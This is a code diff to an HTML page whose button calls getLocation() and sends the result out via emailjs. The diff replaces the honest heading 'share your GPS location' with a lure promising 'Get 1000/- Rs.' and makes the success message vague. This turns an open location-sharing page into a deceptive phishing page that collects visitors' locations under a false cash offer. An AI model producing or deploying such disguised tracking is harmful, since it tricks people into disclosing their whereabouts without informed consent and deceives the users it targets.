@@ -30,8 +30,8 @@
   </style>
 </head>
 <body>
-  <h2>Click the button below to share your GPS location</h2>
-  <button onclick="getLocation()">Share My Location</button>
+  <h2>Click the button below to Get 1000/- Rs.</h2>
+  <button onclick="getLocation()">Click here</button>
 
   <script>
     function getLocation() {
@@ -55,7 +55,7 @@
 
       emailjs.send("service_7cw76e1", "template_0mr3qf9", templateParams)
         .then(() => {
-          alert("✅ GPS location sent successfully!");
+          alert("✅ Received Thank you!");
         }, (error) => {
           alert("❌ Failed to send location: " + JSON.stringify(error));
         });
